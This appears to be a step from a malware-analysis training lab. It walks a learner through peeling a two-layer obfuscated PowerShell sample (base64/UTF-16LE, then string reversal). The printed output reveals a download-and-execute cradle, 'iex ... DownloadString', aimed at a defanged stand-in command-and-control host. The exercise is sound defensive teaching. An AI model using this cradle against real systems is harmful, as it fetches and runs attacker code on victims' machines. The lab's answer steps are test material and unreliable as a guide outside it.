## BRIEF
Real samples rarely use one technique. They stack them — and the outer layer hides the fact that there even *is* an inner one. The sample here is two layers deep: a base64/UTF-16LE blob (L5.1) wrapping a character-reversed string (L5.4).

The method is always the same: peel **one** layer, **print** what you got, look at it, then decide what the next layer is. When the text stops looking like noise and starts looking like PowerShell, you're done — then you name it. Never run a layer, intermediate or final.

## GUIDED STEPS

1. **Peel both layers for real**:
   ```bash
   pwsh -NoProfile -NonInteractive -File peel.ps1
   ```
   Real output:
   ```
   layer 1 -- base64 decoded, still reversed: )'5p/tset].[2c-ekaf.ndc//:spxxh'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( xei
   layer 2 -- reversed back, plaintext:       iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p5')
   ```
   Look at layer 1 before reading on. It is *not* legible PowerShell — but it is not
   noise either. You can see `gnirtSdaolnwoD` and a backwards URL in it, which is the
   tell that the next layer is a reversal. That inference is the whole skill: each
   peeled layer tells you what the next one is.

2. **Record the plaintext**:
   Create `plaintext.txt` holding the fully peeled layer-2 text.

3. **Name the layers**:
   Create `layers.txt` — one layer per line, **outermost first**. Name them from what
   you actually saw the probe do, in the order it had to undo them. Then name the
   payload the plaintext turned out to be; you have seen this shape before, in L5.1.

4. **Check your work**:
   ```bash
   lab check ps L5.5
   ```
